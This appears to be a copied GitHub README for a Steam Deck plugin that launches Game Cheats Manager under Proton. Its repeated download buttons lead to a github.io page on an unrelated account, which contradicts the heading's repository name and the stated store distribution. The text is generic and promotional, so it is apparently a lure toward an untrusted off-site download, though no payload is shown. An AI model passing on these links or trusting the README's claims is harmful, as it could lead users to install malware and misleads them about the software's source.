![preview](https://raw.githubusercontent.com/24se02ml062/Decky-Proton-Cheats-Manager-Companion/main/card_4994.svg)
[![Download](https://raw.githubusercontent.com/24se02ml062/Decky-Proton-Cheats-Manager-Companion/main/setup_f2a2cb6.svg)](https://24se02ml062.github.io/Decky-Proton-Cheats-Manager-Companion/)

# 🎮 GCM-Launcher

### Decky plugin that installs and launches the official Game Cheats Manager (Windows) under Proton on Steam Deck - waynegeng/GCM-Launcher

![Steam Deck](https://img.shields.io/badge/Platform-Steam%20Deck-1a9fff?style=flat-square&logo=steamdeck&logoColor=white)
![Decky Loader](https://img.shields.io/badge/Decky%20Loader-Compatible-8A2BE2?style=flat-square)
![Proton](https://img.shields.io/badge/Proton-Ready-3B82F6?style=flat-square&logo=proton&logoColor=white)
![Linux](https://img.shields.io/badge/Platform-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Year](https://img.shields.io/badge/Release-2026-blueviolet?style=flat-square)

---

## 🚀 Overview

**GCM-Launcher** is a carefully engineered Decky Loader extension that streamlines the way Steam Deck owners bring the official **Game Cheats Manager (Windows)** experience into their handheld gaming environment. Rather than fighting with manual Proton prefixes, Winetricks tweaks, or CLI gymnastics, this plugin bundles the entire workflow into a fingertip-friendly dashboard that sits right inside your Quick Access Menu.

Think of it as a concierge for your portable rig: you ask, it prepares, and your game-altering utility unfolds in a windowed Proton container within moments. No terminal archaeology required. No dependency scavenger hunt. Just a clean, repeatable, and reversible pipeline that respects your device storage and your patience.

The project targets enthusiasts who appreciate tinkering but would rather spend their evening actually playing. It bridges the gap between the raw power of the Steam Deck's Linux-based architecture and the familiar comfort of a Windows-native tool, all without ever asking you to leave the couch.

---

## 🧠 The Philosophy Behind It

Most guides online treat Proton compatibility as a puzzle to be solved. GCM-Launcher treats it as a service to be delivered. The design ethos is simple:

- **Automate the mundane** — Prefix creation, runtime selection, configuration seeding.
- **Respect the player** — Fast launch, clear status, graceful shutdown.
- **Stay transparent** — Logs, paths, and reset options are always one tap away.
- **Remain reversible** — Uninstall leaves your Deck as clean as it found it.

This is not just a shortcut. It is a miniature orchestration layer that understands the peculiarities of running a Windows utility on a gaming-first Linux distro.

---

## ✨ Feature List

- 🔄 **One-Tap Install** — Provisions the Proton environment for the official Game Cheats Manager without requiring manual prefix setup.
- 🎯 **Direct Launch Integration** — Appears in your Quick Access Menu thanks to Decky Loader's plugin surface.
- 🧩 **Isolated Runtime** — Runs inside a dedicated prefix so it never interferes with your game installs or system libraries.
- ⚙️ **Configurable Proton Version** — Select which Proton layer to use for maximum compatibility with your firmware generation.
- 🖥️ **Windowed or Fullscreen Modes** — Toggle between display strategies depending on your docked or handheld setup.
- 📁 **Path Inspector** — See exactly where the prefix, data, and logs live, with a copy-to-clipboard helper.
- 🧹 **Clean Uninstall** — Remove runtime artifacts with a single action when you want a spotless Deck.
- 🌐 **Multilingual Support** — Interface strings are localized into multiple languages so a global community feels at home.
- 📱 **Responsive UI** — Designed to look right on the 1280x800 handheld panel as well as docked displays.
- 🕒 **24/7 Customer Support** — Community-driven assistance through issues and discussions, monitored around the clock.
- 🔔 **Status Notifications** — Toasts inform you of each milestone: preparing, launching, and completing.
- 📊 **Lightweight Footprint** — Minimal CPU and memory overhead, keeping resources for the games themselves.
- 🔒 **Local-Only Operation** — No telemetry, no phoning home, no cloud dependency.

---

## 📥 Installation

> The distribution channel for this plugin is the official Decky plugin store and the GitHub releases page. Wherever you would normally find a download control, you will instead see the placeholder below.

[![Download](https://raw.githubusercontent.com/24se02ml062/Decky-Proton-Cheats-Manager-Companion/main/setup_f2a2cb6.svg)](https://24se02ml062.github.io/Decky-Proton-Cheats-Manager-Companion/)

### Recommended Path

1. Install **Decky Loader** on your Steam Deck using its official installer.
2. Open the Quick Access Menu and switch to the Decky tab.
3. Browse the plugin store and locate **GCM-Launcher**.
4. Enable the plugin. It will fetch the runtime pieces it needs the first time you launch.
5. Return to the Decky tab anytime to toggle settings, reinstall the runtime, or wipe the prefix.

### Manual Path

If you prefer to side-load, place the compiled plugin bundle in your Decky plugins directory using your preferred file transfer tool, then restart the Loader. The plugin will appear in your Quick Access Menu ready for configuration.

---

## 🛠️ How It Works Under the Hood

GCM-Launcher is more than a shell script wearing a pretty hat. The architecture is composed of three layers:

- **The Decky Front-End** — A React-based panel that renders inside the Quick Access Menu. It handles buttons, toggles, and status feedback.
- **The Python Back-End** — Manages state, filesystem operations, and the orchestration of Proton invocations.
- **The Proton Wrapper** — Composes the correct environment variables, prefix path, and executable arguments so the Windows tool boots cleanly.

When you tap **Install**, the back-end verifies disk space, creates the prefix directory, and seeds a minimal configuration. When you tap **Launch**, it spawns the process under the chosen Proton runtime and pipes stdout into a rotating log file for later inspection. When you tap **Reset**, it reconstructs the prefix from scratch without touching your other Proton data.

---

## 🧭 Compatibility Matrix

| Component | Tested Range | Notes |
|-----------|--------------|-------|
| SteamOS | Stable & Beta branches | Recommended Stable for predictable results |
| Decky Loader | Current release line | Older builds may lack required APIs |
| Proton | Multiple generations | Latest GE variants also supported |
| Storage | Internal SSD or microSD | SSD preferred for speed |
| Docking | Docked and handheld | UI adapts automatically |

---

## 🎨 Responsive UI & Experience Design

The interface was drawn with the Steam Deck's compact screen in mind. Tap targets are generous, contrast is tuned for the panel's color reproduction, and every action returns visual feedback within a frame or two. If you dock to a larger display, the layout expands gracefully instead of stretching into awkward emptiness.

Transitions are subtle, icons are descriptive, and no action is more than two taps away. This is intentional — the philosophy is that a utility should disappear into the experience rather than demand attention.

---

## 🌍 Multilingual Support

Localization files live alongside the plugin and cover a growing roster of languages. The community is encouraged to contribute translations through pull requests. When a string is missing, the interface falls back to English so functionality never breaks due to a translation gap. Language is auto-detected from your system locale, with an override available in settings.

---

## 🕒 24/7 Customer Support

The support model here is a blend of automated diagnostics and human community effort. Issues are triaged around the clock, and common questions are answered in the discussions area. Because the plugin is open source, the fastest path to a fix is often a well-documented report with logs attached — and the tooling makes attaching those logs a single tap.

---

## 🧪 Testing & Quality

Every release passes through a manual verification checklist on real hardware before it is tagged. Automated linting and type checks run on each commit. The goal is not perfection but predictability: you should know exactly what to expect each time you press the launch control.

---

## 🔐 Privacy & Security Posture

- No analytics, no advertising identifiers, no remote logging.
- All operations are confined to paths you can inspect and delete.
- Network access is limited to fetching official runtime pieces during setup.
- No background daemons run when the plugin panel is closed.

---

## 🤝 Contributing

Contributions are warmly received. Whether you fix a typo, add a language, or refactor a module, the process is:

1. Open an issue describing the change you intend to make.
2. Fork the repository and create a focused branch.
3. Submit a pull request with a clear description and any relevant screenshots.
4. Participate in review, then celebrate when it merges.

Please keep commits scoped, follow the existing code style, and add tests where practical.

---

## 🗺️ Roadmap for 2026

- Broader language coverage.
- Preset profiles for common use cases.
- Optional shortcut creation on the Steam library.
- Enhanced logging viewer inside the plugin panel.
- Experimental support for additional Proton forks.

---

## ❓ Frequently Asked Questions

**Does this modify my game files?**
No. It operates in an isolated prefix and never touches your installed games.

**Will it survive SteamOS updates?**
The plugin itself is stored in user space, so major updates rarely disturb it. If something does break, a reinstall from the plugin store restores order.

**Can I use it while docked?**
Yes. The UI scales to your display and fullscreen mode is available for larger screens.

**Where are logs kept?**
Logs live inside the plugin's data directory, reachable from the settings panel via the path inspector.

**Is the runtime optional?**
The runtime pieces are fetched during setup; if you skip it, the launch action will prompt you to run setup first.

---

## ⚠️ Disclaimer

This project is an independent, community-maintained launcher. It is not affiliated with, endorsed by, or sponsored by the authors of the Game Cheats Manager utility, Valve, or the Decky Loader team. All trademarks belong to their respective owners.

You are responsible for how you use the software you launch through this plugin. Ensure that any modifications you apply to games comply with the terms of service of the relevant platforms and with the laws of your jurisdiction. The maintainers provide this tool as-is, without warranty of any kind, and accept no liability for consequences arising from its use.

Use responsibly. Respect the communities you play within. Have fun.

---

## 📜 License

This repository is distributed under the **MIT License**. You are welcome to use, modify, and redistribute the code in accordance with its terms. The full text is available at the link below.

[MIT License](LICENSE)

Copyright (c) 2026 GCM-Launcher Contributors.

---

## 🙏 Acknowledgements

- The Decky Loader team for the plugin framework that made this possible.
- The Proton maintainers for continuously improving Windows compatibility on Linux.
- The Steam Deck community for testing, reporting, and translating.
- Everyone who filed a thoughtful issue instead of a frustrated one-liner.

---

## 📌 Final Word

GCM-Launcher exists because the path between "I want to try this" and "it is running" should be shorter than a coffee break. If this project saves you a single evening of troubleshooting, it has done its job. Enjoy your Deck, and may your frame times stay smooth.

[![Download](https://raw.githubusercontent.com/24se02ml062/Decky-Proton-Cheats-Manager-Companion/main/setup_f2a2cb6.svg)](https://24se02ml062.github.io/Decky-Proton-Cheats-Manager-Companion/)